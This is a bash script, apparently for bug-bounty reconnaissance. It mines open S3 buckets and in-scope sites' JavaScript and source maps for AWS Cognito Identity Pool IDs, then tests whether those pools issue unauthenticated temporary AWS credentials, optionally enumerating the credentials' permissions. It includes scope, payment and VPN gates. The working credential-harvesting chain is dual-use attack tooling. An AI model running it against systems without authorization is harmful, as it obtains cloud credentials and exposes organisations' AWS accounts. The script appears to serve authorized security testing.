#!/usr/bin/env bash
# =============================================================================
# recon_cognito.sh — unauthenticated AWS Cognito Identity Pool cred-issuance lane
#
# THE CHAIN (H1 #3800848, Logitech, Critical): open build/asset bucket OR an
# in-scope host's own JS -> source maps / Amplify config -> Cognito Identity Pool
# IDs -> pools configured for unauthenticated ("guest") access hand out valid
# temporary AWS credentials to anyone. Confirmed the reference way (hackingthe.cloud
# / Yassine Aboukir): GetId -> GetCredentialsForIdentity with NO logins, unsigned.
#
# ADDRESSING (learned from the oracle dhg-app-builds): anon GET via the raw S3 API
# is often AccessDenied while GET via the bucket's HOST ALIAS (CNAME / website /
# CDN endpoint) returns 200. So we LIST + FETCH via the host alias with curl.
#
# SAFETY (hard line):
#   * cognito-identity/sts calls hit AWS, not the bug-bounty host.
#   * NEVER pass --logins / creds (guest path only); default STOPS at role ARN.
#   * --assess adds a SAFE permission-enumeration (list_/describe_ only, no object
#     /item DATA reads, no writes) to prove blast radius (Medium -> High/Critical).
#   * provenance + per-asset scope + pays gate before any CONFIRMED mint.
#   * read-only fetch, Mullvad egress, fail-closed on vpn_down.
#
# USAGE:
#   recon_cognito.sh buckets [build_open.jsonl]  mine open buckets -> pools.jsonl
#   recon_cognito.sh hosts   [hostfile]          mine in-scope host JS -> pools.jsonl
#   recon_cognito.sh test    [pools.jsonl] [--assess]   test issuance (+blast radius)
#   recon_cognito.sh run     [build_open.jsonl] [--assess]   mine buckets -> test -> mint
#   recon_cognito.sh results
# =============================================================================
set -uo pipefail
IFS=$'\n\t'
log(){ printf '[%s COGNITO] %s\n' "$(date -u '+%FT%TZ')" "$*" >&2; }

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$SCRIPT_DIR/recon_net.sh" 2>/dev/null || true
type setup_es_netrc >/dev/null 2>&1 && setup_es_netrc || true
ES_NETRC="$HOME/.recon_es_netrc"
BASE_DIR="${BASE_DIR:-$HOME/recon}"
STATE_DIR="${STATE_DIR:-$BASE_DIR/state}"
ES_URL="${ES_URL:-http://127.0.0.1:9200}"; INDEX="${INDEX_NAME:-recon_alive}"
SCOPE_CHECK="${SCOPE_CHECK:-$SCRIPT_DIR/recon_scope_check.sh}"
TESTER="$SCRIPT_DIR/../engine/recon_cognito_test.py"
OUTDIR="$BASE_DIR/cognito"; mkdir -p "$OUTDIR"
POOLS="$OUTDIR/pools.jsonl"; CONFIRMED="$OUTDIR/confirmed.jsonl"; LEADS="$OUTDIR/leads.jsonl"
UA='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/131.0.0.0 Safari/537.36'
POOL_RE='[a-z]{2}-[a-z]+-[0-9]:[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}'
CHAIN_RE='\.map($|[?"])|\.jsbundle|aws-exports|amplifyconfiguration|/amplify|(^|/)(config|env|settings|runtime-config|aws_config|awsconfig)[^/]*\.(js|json)|main[.-][0-9a-f]+\.js|\.bundle\.js|runtime[.-].*\.js|app[.-][0-9a-f]+\.js'
MINE_MAX_PAGES="${MINE_MAX_PAGES:-40}"     # host-alias LIST pages (max-keys=1000)
MINE_MAX_FETCH="${MINE_MAX_FETCH:-40}"     # objects fetched per bucket/host
SOURCEMAPPER="$(command -v sourcemapper 2>/dev/null || true)"
JS_PER_HOST="${JS_PER_HOST:-40}"
touch "$POOLS" "$CONFIRMED" "$LEADS" 2>/dev/null || true
command -v jq >/dev/null 2>&1 || { log "jq missing"; exit 1; }

vpn_gate(){ [[ -f "$STATE_DIR/vpn_down" ]] && { log "vpn_down — refusing target-facing work (fail-closed)"; exit 0; }; }

emit_pool(){ # provenance program pool region source_key kind
  local prov="$1" program="$2" pool="$3" region="$4" key="$5" kind="$6"
  jq -nc --arg h "$prov" --arg p "$program" --arg pool "$pool" --arg r "$region" \
    --arg k "$key" --arg kind "$kind" --arg t "$(date -u '+%FT%TZ')" \
    '{provenance:$h,program:$p,pool:$pool,region:$r,source_key:$k,kind:$kind,at:$t}' >> "$POOLS"
  log "  POOL $pool ($region) <- $prov :: $kind ${key:+[$key]}"
}

scan_file_for_pools(){ # file provenance program source_key kind
  local f="$1" prov="$2" program="$3" key="$4" kind="$5"
  grep -aoE "$POOL_RE" "$f" 2>/dev/null | sort -u | while read -r pool; do
    [ -n "$pool" ] && emit_pool "$prov" "$program" "$pool" "${pool%%:*}" "$key" "$kind"
  done
}

# --- bucket LIST -> keys on stdout. Prefer the raw S3 API (aws-cli auto-paginates
# fully); fall back to host-alias list-type=2 with start-after pagination (stateless,
# reliable — dodges the v1 no-NextMarker quirk that caps some buckets at 1000).
alias_list(){ # host [bucket]
  local host="$1" bucket="${2:-}" region api
  region="$(curl -sS -m12 -o /dev/null -D - -A "$UA" "https://${host}/?max-keys=1" 2>/dev/null | tr -d '\r' | awk -F': ' 'tolower($1)=="x-amz-bucket-region"{print $2; exit}')"
  [ -z "$region" ] && region="us-east-1"
  if [ -n "$bucket" ]; then
    api="$(aws s3api list-objects-v2 --bucket "$bucket" --region "$region" --no-sign-request --output text --query 'Contents[].Key' 2>/dev/null | tr '\t' '\n' | grep -a . || true)"
    if [ -n "$api" ]; then printf '%s\n' "$api"; return; fi
  fi
  local after="" page=0 body keys last
  while :; do
    body="$(curl -sS -m25 -A "$UA" "https://${host}/?list-type=2&max-keys=1000${after:+&start-after=$(jq -rn --arg m "$after" '$m|@uri')}" 2>/dev/null)" || break
    keys="$(grep -oE '<Key>[^<]+</Key>' <<<"$body" | sed -E 's,</?Key>,,g')"
    [ -z "$keys" ] && break
    printf '%s\n' "$keys"
    last="$(printf '%s\n' "$keys" | tail -1)"
    grep -qE '<IsTruncated>true</IsTruncated>' <<<"$body" || break
    [ "$last" = "$after" ] && break
    after="$last"; page=$((page+1)); [ "$page" -ge "$MINE_MAX_PAGES" ] && break
  done
}

# --- fetch a key via host alias, scan for pools (maps -> sourcemapper first)
fetch_scan(){ # host program bucket key
  local host="$1" program="$2" bucket="$3" key="$4" ekey tf W
  ekey="$(printf '%s' "$key" | sed 's, ,%20,g')"
  tf="$(mktemp)"
  curl -sS -m40 --max-filesize 20000000 -A "$UA" "https://${host}/${ekey}" -o "$tf" 2>/dev/null || { rm -f "$tf"; return; }
  [ -s "$tf" ] || { rm -f "$tf"; return; }
  case "$key" in
    *.map)
      if [ -n "$SOURCEMAPPER" ]; then
        W="$(mktemp -d)"; timeout 45 "$SOURCEMAPPER" -input "$tf" -output "$W" >/dev/null 2>&1 || true
        [ -d "$W" ] && grep -aoE "$POOL_RE" -r "$W" 2>/dev/null | sed -E 's,^[^:]*:,,' | sort -u | while read -r pool; do
          [ -n "$pool" ] && emit_pool "$host" "$program" "$pool" "${pool%%:*}" "$key" "bucket-sourcemap"
        done
        rm -rf "$W"
      fi
      scan_file_for_pools "$tf" "$host" "$program" "$key" "bucket-map-raw" ;;
    *) scan_file_for_pools "$tf" "$host" "$program" "$key" "bucket-object" ;;
  esac
  rm -f "$tf"
}

cmd_buckets(){
  vpn_gate
  local IN="${1:-$BASE_DIR/buckets/build_open.jsonl}"
  [ -s "$IN" ] || { log "no bucket input ($IN)"; exit 0; }
  while IFS= read -r line; do
    [ -z "$line" ] && continue
    local host program bucket keys ni
    host="$(jq -r '.host' <<<"$line")"; program="$(jq -r '.program' <<<"$line")"; bucket="$(jq -r '.bucket' <<<"$line")"
    log "== mining $host ($bucket) [$program] =="
    keys="$(mktemp)"; alias_list "$host" "$bucket" | awk 'NF && !s[$0]++' > "$keys"
    log "   keys listed: $(wc -l < "$keys" | tr -d ' ')"
    # chain artifacts, prioritised: (1) explicit Amplify/aws-exports config,
    # (2) source maps NEWEST-first (sort -rV; iOS before android — that's where the
    # Amplify config with the pool ids lives), (3) config/env, (4) app bundles.
    local fetch; fetch="$(mktemp)"
    { grep -aiE 'aws-exports|amplifyconfiguration|/amplify|aws_config|awsconfig' "$keys";
      { grep -aiE '/ios/.*\.map$' "$keys" | sort -rV; grep -aiE '\.map$' "$keys" | grep -aiv '/ios/' | sort -rV; };
      grep -aiE '(^|/)(config|env|settings|runtime-config)[^/]*\.(js|json)$' "$keys";
      grep -aiE 'main[.-][0-9a-f]+\.js$|app[.-][0-9a-f]+\.js$|\.bundle\.js$|runtime[.-].*\.js$' "$keys"; } \
      | awk 'NF && !s[$0]++' | head -n "$MINE_MAX_FETCH" > "$fetch"
    ni="$(wc -l < "$fetch" | tr -d ' ')"; log "   chain artifacts to fetch: $ni"
    while IFS= read -r key; do [ -n "$key" ] && fetch_scan "$host" "$program" "$bucket" "$key"; done < "$fetch"
    rm -f "$keys" "$fetch"
  done < "$IN"
  log "bucket mine done — pools so far: $(jq -r '.pool' "$POOLS" 2>/dev/null | sort -u | wc -l | tr -d ' ')"
}

cmd_hosts(){
  vpn_gate
  local HF="${1:-}"; local -a hosts
  if [ -n "$HF" ] && [ -s "$HF" ]; then mapfile -t hosts < "$HF"
  else
    # in-scope+paying hosts whose JS references cognito/amplify (from endpoints.jsonl)
    mapfile -t hosts < <(grep -aiE 'cognito|amplify|identitypool|aws-exports' "$BASE_DIR/js_recon/endpoints.jsonl" 2>/dev/null \
      | jq -r '.host // empty' 2>/dev/null | awk 'NF && !s[$0]++' | head -50)
  fi
  [ "${#hosts[@]}" -gt 0 ] || { log "no cognito-referencing hosts"; exit 0; }
  log "host JS prong: ${#hosts[@]} host(s)"
  for host in "${hosts[@]}"; do
    [[ -f "$STATE_DIR/vpn_down" ]] && break
    local program wd
    program="$(curl -sS -m10 --netrc-file "$ES_NETRC" "$ES_URL/$INDEX/_source/$host" 2>/dev/null | jq -r '.triage_program // ""' 2>/dev/null)"
    wd="$(mktemp -d)"; mkdir -p "$wd/js"
    { printf 'https://%s/\n' "$host" | timeout 45 subjs 2>/dev/null
      timeout 60 katana -u "https://$host/" -d 2 -jc -silent -nc 2>/dev/null | grep -aiE '\.js(\?|$)'
      printf '%s\n' "$host" | timeout 40 gau --threads 5 2>/dev/null | grep -aiE '\.js(\?|$)'
    } | awk 'NF && !s[$0]++' | grep -aiE '^https?://' | head -n "$JS_PER_HOST" > "$wd/u.txt"
    local i=0
    while IFS= read -r ju; do
      [ -z "$ju" ] && continue
      curl -fsSL -m20 --max-filesize 12000000 -A "$UA" "$ju" -o "$wd/js/$i.js" 2>/dev/null
      # reconstruct external source map if advertised
      if [ -n "$SOURCEMAPPER" ] && [ -s "$wd/js/$i.js" ] && grep -aoiE 'sourcemappingurl=[^[:space:]*]+' "$wd/js/$i.js" 2>/dev/null | grep -qiv 'data:'; then
        timeout 30 "$SOURCEMAPPER" -jsurl "$ju" -output "$wd/src/$i" >/dev/null 2>&1 || true
      fi
      i=$((i+1))
    done < "$wd/u.txt"
    { compgen -G "$wd/js/*.js"; find "$wd/src" -type f 2>/dev/null; } 2>/dev/null | while read -r f; do
      [ -s "$f" ] && scan_file_for_pools "$f" "$host" "$program" "$(basename "$f")" "host-js"
    done
    rm -rf "$wd"
  done
}

cmd_test(){
  local PF="${POOLS}"; local assess=""
  for a in "$@"; do case "$a" in --assess) assess="--assess";; *.jsonl) PF="$a";; esac; done
  [ -s "$PF" ] || { log "no pools file"; exit 0; }
  command -v python3 >/dev/null || { log "python3 missing"; exit 1; }
  # unique pools with a provenance host + program
  local uf; uf="$(mktemp)"
  jq -r '[.pool,.region,(.provenance//""),(.program//"")]|@tsv' "$PF" | awk -F'\t' '!s[$1]++' > "$uf"
  log "testing $(wc -l < "$uf" | tr -d ' ') unique pool(s) $assess"
  while IFS=$'\t' read -r pool region prov program; do
    [ -z "$pool" ] && continue
    local v; v="$(python3 "$TESTER" "$pool" --region "$region" $assess 2>/dev/null)"
    local verdict; verdict="$(jq -r '.verdict // "error"' <<<"$v")"
    v="$(jq -c --arg prov "$prov" --arg prog "$program" '. + {provenance:$prov,program:$prog}' <<<"$v")"
    case "$verdict" in
      issued)
        printf '%s\n' "$v" >> "$CONFIRMED"
        log "  ✅ ISSUED $pool -> $(jq -r '.assumed_role_arn // .account // "?"' <<<"$v")  [$prov]"
        # scope+pays gate + mint (best-effort)
        if [ -n "$prov" ] && command -v python3 >/dev/null; then
          if bash "$SCOPE_CHECK" --filter in-scope-paying <<<"$prov" 2>/dev/null | grep -qxF "$prov"; then
            type db_confirm >/dev/null 2>&1 && db_confirm "$prov" "https://$prov/" "$program" "cognito-unauth" "unauth-cognito-cred-issuance" "9" "0.9" "$v" && log "     minted CONFIRMED (scope+pays ok)"
          else
            log "     (provenance not in-scope-paying per scope_check — lead only)"
          fi
        fi ;;
      misconfigured|denied|notfound)
        printf '%s\n' "$v" >> "$LEADS"; log "  · $verdict $pool [$prov]" ;;
      *) log "  ? $verdict $pool ($(jq -r '.error // ""' <<<"$v"))" ;;
    esac
  done < "$uf"
  rm -f "$uf"
}

case "${1:-run}" in
  buckets) shift; cmd_buckets "$@" ;;
  hosts)   shift; cmd_hosts "$@" ;;
  test)    shift; cmd_test "$@" ;;
  run)     shift; a=""; f=""; for x in "$@"; do case "$x" in --assess) a="--assess";; *) f="$x";; esac; done
           cmd_buckets "$f"; cmd_test "$POOLS" $a ;;
  results) echo "== ISSUED (confirmed) =="; jq -r '"\(.pool)  \(.account//"?")  \(.assumed_role_arn//"?")  <- \(.provenance//"?")"' "$CONFIRMED" 2>/dev/null | sort -u
           echo "== pools harvested =="; jq -r '.pool' "$POOLS" 2>/dev/null | sort -u | wc -l ;;
  *) echo "usage: $0 [buckets|hosts|test|run|results] [args] [--assess]" >&2; exit 2 ;;
esac
